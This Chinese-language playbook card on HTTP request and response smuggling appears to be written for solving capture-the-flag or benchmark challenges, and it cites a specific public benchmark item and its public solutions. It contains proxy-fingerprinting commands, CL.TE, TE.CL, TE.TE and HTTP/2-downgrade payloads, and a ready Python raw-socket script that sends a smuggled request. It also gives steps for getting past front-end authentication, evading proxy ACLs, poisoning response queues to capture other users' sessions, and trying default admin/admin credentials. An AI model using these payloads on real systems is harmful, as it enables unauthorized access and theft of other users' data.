# 卡:HTTP 请求/响应走私(Request/Response Smuggling · Desync)

**适用**:目标前面有**多级代理/网关**(响应头 `Server` 与会话行为不一致、403 来自代理、`Via/X-Forwarded-*`、
超时/截断怪象),或题面提到 "outdated proxies / complicated stacks"。
公开基准里 L3 有一题就是这个类型;我们此前完全没有这条武器。

> 口径:通用方法论,与具体题目无关;payload 以目标实测为准。

## 0. 先判断"有没有走私面"(5 分钟)
1. **代理链指纹**:
```bash
curl -sk -i http://T/ | head -25            # Server / Via / X-Powered-By / 多个 Set-Cookie
curl -sk -i -X OPTIONS http://T/ | head -20 # Allow / 代理行为
printf 'GET / HTTP/1.1\r\nHost: T\r\n\r\n' | nc -w 5 T 80   # 直连后端?看是否与浏览器行为不同
```
2. **行为差异**:同一请求走 `?x=1`、带 `Content-Length` 与 `Transfer-Encoding` 两种写法、大小写变体
   (`Transfer-Encoding: chunked` / `chunked ` / `xchunked`),响应/耗时是否不同 —— 差异就是缝隙。

## 0.5 黑盒怎么"发现"内部路由(没有源码时)
- **错误回显是最好的情报**:找到任何会"服务端去请求自己内部地址"的表单/设置页(POST 后报错),
  错误信息里常直接带**内部主机名/vhost**(如 `internal.xxx`)、内部端口、curl 报错;
- 官方口径若写的是 **Response Smuggling**,公开解法常按 **Request Smuggling(CL.TE)** 做 —— **两种都试**;
- 目标终点通常是"内部管理/状态接口"(只有内部 Host 才路由得到);把**内部 Host 放进走私请求的 Host 头**,
  再看响应是否变成内部接口的内容。

## 1. 四类经典形态(先小规模验证,再放大利用)
| 形态 | 探测写法(示意) | 判据 |
|---|---|---|
| **CL.TE** | 头里同时给 `Content-Length: 6` 与 `Transfer-Encoding: chunked`,body `0\r\n\r\nG` | 后端把 G 当下一请求 → 下一响应错位/超时 |
| **TE.CL** | 给 `Transfer-Encoding: chunked`,body 用 chunk 骗前端、CL 骗后端 | 同上,方向相反 |
| **TE.TE(混淆)** | `Transfer-Encoding: chunked` + `Transfer-Encoding: identity` / `xchunked` / 双写 | 一端忽略、一端处理 → 缝隙 |
| **H2 降级** | HTTP/2 的 `:path` 里塞 `\r\n` 或 CL/TE 组合,下游按 HTTP/1.1 解析 | 下游把注入内容当新请求 |
> 066 这类"**响应走私**":让**前端的响应**排队错位,把**别人的响应**(可能含敏感数据/管理页)回给你 —— 探测思路相同,
> 但目标是"投毒响应队列",不是"注入请求"。

## 2. 可直接用的原始套接字模板(python, 别用 curl —— curl 会重写头)
```python
import socket, time
def raw(host, port, data, wait=3):
    s = socket.create_connection((host, port), timeout=5)
    s.sendall(data); s.settimeout(wait); out=b""
    try:
        while True:
            b = s.recv(65536)
            if not b: break
            out += b
    except Exception: pass
    s.close(); return out

# CL.TE 探测:前端按 CL 收 6 字节,后端按 chunked 把 "G" 当新请求的起点
req = (b"POST / HTTP/1.1\r\nHost: T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
       b"0\r\n\r\nG")
print(raw("T", 80, req))
```
- 把 `G` 换成完整请求(`GET /admin HTTP/1.1\r\nHost: T\r\n\r\n`)就是"请求走私";
- 观察**下一个请求的响应**是否变成你注入的路径 —— 需要**两个连接**配合(先投毒、再用干净请求取响应)。

## 3. 利用方向(选一个最短的)
- 绕过前端鉴权:走私一个 `GET /admin/...` 到后端(前端只看第一个请求);
- 命中"只允许内网/本机"的路由(代理的 ACL 只在第一跳生效);
- 响应队列投毒:把别人的会话/管理页响应错位到自己连接上;
- 结合默认口令:走私进管理面板后,再试 `admin/admin` 一类默认值(见 `device-admin-panel`)。

## 4. 纪律
- **每次只改一个头**(长度/编码/大小写),并记录前后响应差异;
- 走私失败常见于:代理把重复头合并、连接复用被禁、后端是 HTTP/2 —— 换形态前先确认这些;
- 别用并发洪水试探(会污染判断);用**串行 + 固定连接**;
- 两次形态都无差异 → 写下"无走私面(证据:…)";不要陷在编码变体里。